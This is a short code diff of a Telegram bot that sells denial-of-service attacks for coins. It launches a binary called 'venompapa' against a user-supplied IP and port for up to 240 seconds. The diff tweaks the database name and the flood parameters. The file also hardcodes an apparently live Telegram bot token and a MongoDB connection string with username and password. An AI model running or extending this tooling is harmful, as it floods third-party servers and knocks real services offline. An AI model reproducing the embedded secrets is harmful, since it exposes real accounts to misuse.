@@ -12,7 +12,7 @@ attack_history = []  # Store attack logs
 TELEGRAM_BOT_TOKEN = '8034991854:AAFZvlaurx4seAcgKaelO7F8rlXvnSMEQhQ'
 ADMIN_USER_ID = 7353797869
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
-DB_NAME = "Roxz"
+DB_NAME = "Roz"
 COLLECTION_NAME = "users"
 ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./venompapa {ip} {port} {duration} {9} {2000}"
+        command = f"./venompapa {ip} {port} {duration} {10} {2100}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
